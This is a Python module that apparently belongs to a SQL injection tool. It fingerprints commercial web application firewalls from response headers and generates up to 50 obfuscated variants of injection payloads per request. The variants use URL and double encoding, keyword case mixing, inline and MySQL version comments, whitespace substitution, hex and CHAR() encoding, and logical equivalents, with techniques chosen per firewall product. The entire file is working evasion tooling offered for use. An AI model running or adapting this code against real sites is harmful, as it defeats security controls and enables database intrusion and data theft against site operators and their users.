#!/usr/bin/env python3
"""
WAF Bypass Module
Implements various WAF bypass techniques and obfuscation methods
"""

import urllib.parse
import base64
import random
import string
from typing import List, Dict, Tuple, Optional
import re
import logging

class WAFFingerprint:
    """Identifies WAF/IDS systems"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.waf_signatures = self._load_waf_signatures()
    
    def _load_waf_signatures(self) -> Dict[str, List[str]]:
        """Load WAF signatures"""
        return {
            'Cloudflare': [
                r'cloudflare',
                r'cf-ray',
                r'__cfduid',
                r'cf-cache-status'
            ],
            'AWS WAF': [
                r'aws-waf',
                r'x-amz-cf-id',
                r'x-amzn-requestid'
            ],
            'ModSecurity': [
                r'mod_security',
                r'modsecurity',
                r'NOYB',
                r'Server: Apache'
            ],
            'Akamai': [
                r'akamai',
                r'akamai-ghost',
                r'x-akamai-request-id'
            ],
            'Imperva': [
                r'imperva',
                r'incapsula',
                r'x-iinfo',
                r'x-cdn'
            ],
            'F5 BIG-IP': [
                r'bigip',
                r'ts.*f5',
                r'f5-*'
            ],
            'Barracuda': [
                r'barracuda',
                r'barra_counter',
                r'__utma'
            ],
            'Sucuri': [
                r'sucuri',
                r'sucuri_cloudproxy',
                r'x-sucuri-id'
            ],
            'Wordfence': [
                r'wordfence',
                r'wfvt',
                r'wordpress'
            ]
        }
    
    def detect_waf(self, response_headers: Dict[str, str], response_text: str) -> List[str]:
        """Detect WAF based on response headers and content"""
        detected_wafs = []
        
        # Check headers
        headers_text = ' '.join(response_headers.keys()).lower()
        for waf_name, signatures in self.waf_signatures.items():
            for signature in signatures:
                if re.search(signature, headers_text, re.IGNORECASE):
                    detected_wafs.append(waf_name)
                    break
        
        # Check response content
        content_text = response_text.lower()
        for waf_name, signatures in self.waf_signatures.items():
            for signature in signatures:
                if re.search(signature, content_text, re.IGNORECASE):
                    if waf_name not in detected_wafs:
                        detected_wafs.append(waf_name)
                    break
        
        return detected_wafs

class PayloadObfuscator:
    """Obfuscates SQL injection payloads to bypass WAF"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
    
    def url_encode_variations(self, payload: str) -> List[str]:
        """Generate various URL encoding variations"""
        variations = []
        
        # Standard URL encoding
        variations.append(urllib.parse.quote(payload))
        
        # Double URL encoding
        variations.append(urllib.parse.quote(urllib.parse.quote(payload)))
        
        # Partial encoding (only special characters)
        partial_encoded = ''
        for char in payload:
            if char in "'\"\\;(){}[]<>|&^%$#@!*~`":
                partial_encoded += urllib.parse.quote(char)
            else:
                partial_encoded += char
        variations.append(partial_encoded)
        
        # Unicode encoding
        unicode_encoded = ''
        for char in payload:
            if char in "'\"":
                unicode_encoded += f'%u{ord(char):04x}'
            else:
                unicode_encoded += char
        variations.append(unicode_encoded)
        
        return variations
    
    def case_variations(self, payload: str) -> List[str]:
        """Generate case variations of SQL keywords"""
        sql_keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR', 'ORDER', 'BY', 'HAVING', 'GROUP']
        variations = []
        
        # Original
        variations.append(payload)
        
        # All uppercase
        variations.append(payload.upper())
        
        # All lowercase
        variations.append(payload.lower())
        
        # Random case
        random_case = ''
        for char in payload:
            if char.isalpha():
                random_case += random.choice([char.upper(), char.lower()])
            else:
                random_case += char
        variations.append(random_case)
        
        # Mixed case for keywords
        mixed_case = payload
        for keyword in sql_keywords:
            if keyword in mixed_case.upper():
                # Split keyword randomly
                keyword_lower = keyword.lower()
                split_pos = random.randint(1, len(keyword) - 1)
                mixed_variant = keyword_lower[:split_pos] + keyword_lower[split_pos:].upper()
                mixed_case = mixed_case.replace(keyword, mixed_variant)
        variations.append(mixed_case)
        
        return list(set(variations))
    
    def comment_variations(self, payload: str) -> List[str]:
        """Generate comment-based variations"""
        variations = []
        
        # Original
        variations.append(payload)
        
        # Inline comments
        variations.append(payload.replace(' ', '/**/'))
        variations.append(payload.replace(' ', '/*comment*/'))
        
        # Multiple spaces with comments
        variations.append(payload.replace(' ', '/**/**/'))
        variations.append(payload.replace(' ', '/*!00000*/'))
        
        # MySQL version comments
        variations.append(payload.replace('SELECT', '/*!00000SELECT*/'))
        variations.append(payload.replace('UNION', '/*!00000UNION*/'))
        variations.append(payload.replace('FROM', '/*!00000FROM*/'))
        
        # Block comments around keywords
        variations.append(payload.replace('SELECT', 'SE/**/LECT'))
        variations.append(payload.replace('UNION', 'UN/**/ION'))
        variations.append(payload.replace('FROM', 'FR/**/OM'))
        
        # End comment variations
        variations.append(payload.replace('--', '#'))
        variations.append(payload.replace('--', '/* */'))
        variations.append(payload.replace('--', '/*comment*/'))
        
        return variations
    
    def whitespace_variations(self, payload: str) -> List[str]:
        """Generate whitespace variations"""
        variations = []
        
        # Original
        variations.append(payload)
        
        # Tab instead of space
        variations.append(payload.replace(' ', '\t'))
        
        # Multiple spaces
        variations.append(payload.replace(' ', '  '))
        
        # Newline instead of space
        variations.append(payload.replace(' ', '\n'))
        
        # Carriage return
        variations.append(payload.replace(' ', '\r'))
        
        # Form feed
        variations.append(payload.replace(' ', '\f'))
        
        # Vertical tab
        variations.append(payload.replace(' ', '\v'))
        
        # Mixed whitespace
        mixed_whitespace = ''
        for char in payload:
            if char == ' ':
                mixed_whitespace += random.choice(['\t', '\n', '\r', '  ', ' '])
            else:
                mixed_whitespace += char
        variations.append(mixed_whitespace)
        
        return variations
    
    def encoding_variations(self, payload: str) -> List[str]:
        """Generate encoding variations"""
        variations = []
        
        # Original
        variations.append(payload)
        
        # Hex encoding for keywords
        hex_mappings = {
            'SELECT': '0x53454c454354',
            'UNION': '0x554e494f4e',
            'FROM': '0x46524f4d',
            'WHERE': '0x5748455245',
            'AND': '0x414e44',
            'OR': '0x4f52'
        }
        
        hex_encoded = payload
        for keyword, hex_value in hex_mappings.items():
            hex_encoded = hex_encoded.replace(keyword, hex_value)
        variations.append(hex_encoded)
        
        # Base64 encoding (for specific parts)
        if "'" in payload:
            # Extract and encode string literals
            string_pattern = r"'([^']*)'"
            matches = re.findall(string_pattern, payload)
            base64_encoded = payload
            
            for match in matches:
                encoded = base64.b64encode(match.encode()).decode()
                base64_encoded = base64_encoded.replace(f"'{match}'", f"'{encoded}'")
            variations.append(base64_encoded)
        
        # Char() function encoding
        char_encoded = payload
        for char in "'\"":
            char_encoded = char_encoded.replace(char, f'CHAR({ord(char)})')
        variations.append(char_encoded)
        
        return variations
    
    def logical_bypass_variations(self, payload: str) -> List[str]:
        """Generate logical bypass variations"""
        variations = []
        
        # Original
        variations.append(payload)
        
        # Logical equivalents
        logical_replacements = {
            'AND': ['&&', '&'],
            'OR': ['||', '|'],
            '=': ['LIKE', 'REGEXP', 'RLIKE'],
            '1=1': ['1 LIKE 1', '1 REGEXP 1', 'TRUE', '1'],
            '1=2': ['1 LIKE 2', '1 REGEXP 2', 'FALSE', '0']
        }
        
        for original, replacements in logical_replacements.items():
            for replacement in replacements:
                variation = payload.replace(original, replacement)
                if variation != payload:
                    variations.append(variation)
        
        # Mathematical equivalents
        math_replacements = {
            '1=1': ['2-1=1', '3-2=1', '1*1=1', '4/4=1'],
            '1=2': ['2-1=2', '3-2=2', '1*1=2', '4/4=2']
        }
        
        for original, replacements in math_replacements.items():
            for replacement in replacements:
                variation = payload.replace(original, replacement)
                if variation != payload:
                    variations.append(variation)
        
        return variations

class WAFTechniqueSelector:
    """Selects appropriate WAF bypass techniques"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.technique_priorities = self._load_technique_priorities()
    
    def _load_technique_priorities(self) -> Dict[str, List[str]]:
        """Load technique priorities for different WAFs"""
        return {
            'Cloudflare': [
                'url_encode_variations',
                'case_variations',
                'comment_variations',
                'whitespace_variations'
            ],
            'AWS WAF': [
                'case_variations',
                'encoding_variations',
                'logical_bypass_variations',
                'url_encode_variations'
            ],
            'ModSecurity': [
                'comment_variations',
                'whitespace_variations',
                'encoding_variations',
                'case_variations'
            ],
            'Akamai': [
                'url_encode_variations',
                'encoding_variations',
                'case_variations',
                'logical_bypass_variations'
            ],
            'Imperva': [
                'encoding_variations',
                'comment_variations',
                'whitespace_variations',
                'case_variations'
            ],
            'default': [
                'case_variations',
                'url_encode_variations',
                'comment_variations',
                'whitespace_variations',
                'encoding_variations',
                'logical_bypass_variations'
            ]
        }
    
    def select_techniques(self, detected_wafs: List[str]) -> List[str]:
        """Select appropriate bypass techniques based on detected WAFs"""
        if not detected_wafs:
            return self.technique_priorities['default']
        
        # Combine techniques for all detected WAFs
        all_techniques = []
        for waf in detected_wafs:
            techniques = self.technique_priorities.get(waf, self.technique_priorities['default'])
            all_techniques.extend(techniques)
        
        # Remove duplicates while preserving order
        seen = set()
        unique_techniques = []
        for technique in all_techniques:
            if technique not in seen:
                seen.add(technique)
                unique_techniques.append(technique)
        
        return unique_techniques

class WAFBypassEngine:
    """Main WAF bypass engine"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.fingerprinter = WAFFingerprint()
        self.obfuscator = PayloadObfuscator()
        self.technique_selector = WAFTechniqueSelector()
    
    def bypass_payload(self, payload: str, response_headers: Dict[str, str] = None, 
                      response_text: str = None, detected_wafs: List[str] = None) -> List[str]:
        """Generate WAF bypass variations of a payload"""
        
        # Detect WAF if not provided
        if detected_wafs is None and response_headers and response_text:
            detected_wafs = self.fingerprinter.detect_waf(response_headers, response_text)
        
        if not detected_wafs:
            detected_wafs = ['default']
        
        self.logger.info(f"Detected WAFs: {detected_wafs}")
        
        # Select appropriate techniques
        techniques = self.technique_selector.select_techniques(detected_wafs)
        self.logger.info(f"Selected techniques: {techniques}")
        
        # Generate variations
        variations = [payload]  # Start with original
        
        for technique in techniques:
            if hasattr(self.obfuscator, technique):
                method = getattr(self.obfuscator, technique)
                new_variations = method(payload)
                variations.extend(new_variations)
        
        # Remove duplicates and limit to reasonable number
        unique_variations = list(set(variations))
        
        # Prioritize variations (simple ones first)
        prioritized_variations = self._prioritize_variations(unique_variations, payload)
        
        # Limit to top 50 variations to avoid too many requests
        return prioritized_variations[:50]
    
    def _prioritize_variations(self, variations: List[str], original: str) -> List[str]:
        """Prioritize variations based on likely effectiveness"""
        prioritized = []
        other = []
        
        for variation in variations:
            if self._is_high_priority(variation, original):
                prioritized.append(variation)
            else:
                other.append(variation)
        
        return prioritized + other
    
    def _is_high_priority(self, variation: str, original: str) -> bool:
        """Check if variation should be tested first"""
        # Original payload is highest priority
        if variation == original:
            return True
        
        # Simple case variations are high priority
        if variation.upper() == original.upper() or variation.lower() == original.lower():
            return True
        
        # Simple URL encoding is high priority
        if urllib.parse.quote(original) == variation:
            return True
        
        # Simple comment variations
        if '/**/' in variation and variation.replace('/**/', ' ') == original:
            return True
        
        return False
    
    def analyze_waf_response(self, response_headers: Dict[str, str], 
                           response_text: str) -> Dict[str, any]:
        """Analyze WAF response to determine blocking behavior"""
        analysis = {
            'blocked': False,
            'waf_detected': False,
            'waf_type': [],
            'block_indicators': [],
            'response_analysis': {}
        }
        
        # Detect WAF
        waf_detected = self.fingerprinter.detect_waf(response_headers, response_text)
        if waf_detected:
            analysis['waf_detected'] = True
            analysis['waf_type'] = waf_detected
        
        # Check for blocking indicators
        block_indicators = [
            r'blocked',
            r'forbidden',
            r'access denied',
            r'security violation',
            r'attack detected',
            r'malicious request',
            r'waf',
            r'firewall',
            r'protection',
            r'suspicious activity'
        ]
        
        response_lower = response_text.lower()
        for indicator in block_indicators:
            if re.search(indicator, response_lower):
                analysis['blocked'] = True
                analysis['block_indicators'].append(indicator)
        
        # Analyze response characteristics
        analysis['response_analysis'] = {
            'content_length': len(response_text),
            'status_code': response_headers.get('status', ''),
            'content_type': response_headers.get('content-type', ''),
            'server': response_headers.get('server', ''),
            'has_security_headers': any('security' in key.lower() for key in response_headers.keys())
        }
        
        return analysis
